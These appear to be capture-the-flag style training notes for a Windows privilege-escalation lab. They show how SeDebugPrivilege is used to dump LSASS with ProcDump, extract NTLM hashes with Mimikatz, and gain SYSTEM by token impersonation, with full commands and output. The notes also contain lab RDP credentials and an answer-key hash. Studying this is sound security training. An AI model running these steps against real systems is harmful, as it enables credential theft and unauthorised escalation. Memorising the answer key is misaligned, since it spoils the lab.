# SeDebugPrivilege
To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group. 

After logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

We can use **ProcDump** from the **SysInternals** suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system.

```cmd
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).

> Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

```cmd
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP> 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>
```

Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.

## Remote Code Execution as SYSTEM
We can also leverage `SeDebugPrivilege` for RCE. Using this technique, we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a parent process and impersonate it. If we target a parent process running as `SYSTEM` (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. 

First, transfer this [PoC](https://github.com/decoder-it/psgetsystem) script over to the target system. 

Open an elevated PowerShell console, type `tasklist` to get a listing of running processes and accompanying PIDs. 

```pwsh
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

Here we can target winlogon.exe running under PID 612, which we know runs as SYSTEM on Windows hosts.

```pwsh
PS> . .\psgetsys.ps1 

PS> ImpersonateFromParentPid -ppid 612 -command "C:\Windows\System32\cmd.exe" -cmdargs ""
```

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. 

## Questions
RDP to 10.129.86.171 (ACADEMY-WINLPE-SRV01), with user `jordan` and password `HTB_@cademy_j0rdan!`
1. Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account. **Answer: 64f12cddaa88057e06a81b54e73b949b**
   - Leverage `SeDebugPrivilege` to dump the lsass process:
        ```cmd
        C:\Tools>Procdump\procdump.exe -acceptula -ma lsass.exe lsass.dmp
        ```
   - Use mimikatz to obtain NTLM password hash for the user:
        ```cmd
        C:\Tools>Mimikatz\x64\mimikatz.exe

        .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
        .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
        ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
        ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
        '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
        '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

        mimikatz # log
        Using 'mimikatz.log' for logfile : OK

        mimikatz # sekurlsa::minidump lsass.dmp
        Switch to MINIDUMP : 'lsass.dmp'

        mimikatz # sekurlsa::logonpasswords
        Opening : 'lsass.dmp' file for minidump...
        <SNIP>
        Authentication Id : 0 ; 303861 (00000000:0004a2f5)
        Session           : Interactive from 1
        User Name         : sccm_svc
        Domain            : WINLPE-SRV01
        Logon Server      : WINLPE-SRV01
        Logon Time        : 7/8/2026 7:31:38 PM
        SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
                msv :
                [00000006] Primary
                * Username : sccm_svc
                * Domain   : WINLPE-SRV01
                * NTLM     : 64f12cddaa88057e06a81b54e73b949b
                * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
                tspkg :
                wdigest :
                * Username : sccm_svc
                * Domain   : WINLPE-SRV01
                * Password : (null)
                kerberos :
                * Username : sccm_svc
                * Domain   : WINLPE-SRV01
                * Password : (null)
                ssp :
                credman :
        <SNIP>
        ```